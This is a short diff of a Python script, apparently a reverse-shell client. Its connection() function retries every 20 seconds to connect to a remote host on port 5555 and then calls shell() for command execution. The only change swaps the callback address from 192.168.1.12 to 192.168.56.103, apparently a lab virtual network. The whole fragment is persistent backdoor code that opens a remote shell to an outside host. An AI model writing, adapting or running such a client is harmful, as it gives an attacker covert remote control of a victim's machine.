@@ -34,7 +34,7 @@ def connection():
         time.sleep(20)  # Wait for 20 seconds before reconnecting (for resilience)
         try:
             # Connect to a remote host with IP '192.168.1.12' and port 5555
-            s.connect(('192.168.1.12', 5555))
+            s.connect(('192.168.56.103', 5555))
             # Once connected, enter the shell() function for command execution
             shell()
             # Close the connection when done
